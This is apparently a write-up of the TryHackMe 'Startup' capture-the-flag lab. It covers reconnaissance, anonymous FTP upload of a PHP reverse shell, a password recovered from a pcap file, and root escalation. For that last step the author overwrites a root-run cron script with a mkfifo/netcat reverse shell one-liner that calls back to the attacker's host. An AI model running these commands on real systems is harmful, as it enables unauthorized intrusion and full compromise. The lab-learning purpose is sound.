# Startup

**IP:** 10.10.9.176  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 07/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.9.176 -oA nmap/Startup
```

| Port | Service | Version |
|------|---------|---------|
| 21 | ftp | vsftpd 3.0.3 |
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80 | http | Apache httpd 2.4.18 |

## Enumeration

Found a `files` directory on the webserver with an `ftp` directory.
```bash
ffuf -u http://10.10.9.176:80/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -s -fc 403 -e .php,.txt

files
```
![[Pasted image 20250607044842.png]]

## Exploitation

I logged in with `anonymous:anonymous` and uploaded a php reverse shell.
```bash
ftp 10.10.9.176 -i

Connected to 10.10.9.176.
220 (vsFTPd 3.0.3)
Name (10.10.9.176:wither): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php5
local: shell.php5

rlwrap nc -nvlp 9001

listening on [any] 9001 ...
connect to [10.23.121.106] from (UNKNOWN) [10.10.9.176] 55068
SOCKET: Shell has connected! PID: 2062

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

There was a `suspicious.pcapng` file, that I copied to the FTP server and downloaded.
```bash
pwd
/incidents

ls
suspicious.pcapng

cp suspicious.pcapng /var/www/html/files/ftp
```

The file revealed a user `lennie` and a potential password `c4ntg3t3n0ughsp1c3`.
![[Pasted image 20250607055516.png]]
User flag was in `/home/lennie/user.txt`.
```bash
cat /home/lennie/user.txt
```

## Privilege Escalation

There was a `planner.sh` in `/home/lennie/scripts` which ran `/etc/print.sh`.
```bash
ls scripts
planner.sh  startup_list.txt

cat scripts/planner.sh

#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

cat /etc/print.sh

#!/bin/bash
echo "Done!"
```

`pspy64` showed that the script is ran as `root`
```bash
./pspy64
...
2025/06/07 11:31:01 CMD: UID=0     PID=1562   | /bin/bash /home/lennie/scripts/planner.sh 
...
```

I overwrote `/etc/print.sh` with a reverse shell.
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.23.121.106 9001 >/tmp/f' > /etc/print.sh
```

Opened up a listener and successfully got a shell as `root` the next time the script was ran by the system.
```bash
rlwrap nc -nvlp 9001

listening on [any] 9001 ...
connect to [10.23.121.106] from (UNKNOWN) [10.10.9.176] 55346
bash: cannot set terminal process group (22942): Inappropriate ioctl for
bash: no job control in this shell

root@startup:~# 
```

`root` flag was in `/root/root.txt`.
```bash
cat /root/root.txt
```

---
#nmap #ffuf #ftp-anon #pcap-analysis #pspy #cron-privesc #file-overwrite #reverseshell #linux-privesc #thm